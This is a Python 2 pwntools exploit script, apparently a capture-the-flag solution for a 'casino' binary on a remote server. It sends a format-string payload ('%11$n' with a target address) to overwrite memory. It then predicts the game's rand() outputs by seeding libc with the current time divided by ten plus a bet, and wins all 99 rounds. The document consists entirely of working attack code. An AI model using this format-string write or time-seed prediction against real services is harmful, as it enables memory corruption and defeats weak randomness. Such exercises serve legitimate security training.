#! /usr/bin/env python
# -*- coding: utf-8 -*-
# Distributed under terms of the MIT license.
# Author = nepire
from pwn import*
from ctypes import *
context(os='linux',arch='amd64',log_level='debug')
# n = process('./casino')
n = remote('35.243.188.20',2001)
elf = ELF('./casino')
libc = CDLL('/lib/x86_64-linux-gnu/libc.so.6')

bet = 0x03
fmt_offset = 10
seed = libc.time(0)/0xa
print "seed:",hex(seed)
seed += bet
libc.srand(seed)
idx = 1
n.recvuntil('?')
payload = 'aaa%11$n'+p32(0x602020).ljust(8,'\x00')
n.sendline(payload)

for i in range(0,99):
    # n.recvuntil('number: ')
    num = libc.rand()
    sleep(0.08)
    n.sendline(str(num))
    s = "[%03d/100]"%idx
    log.success(s)
    idx += 1

n.interactive()
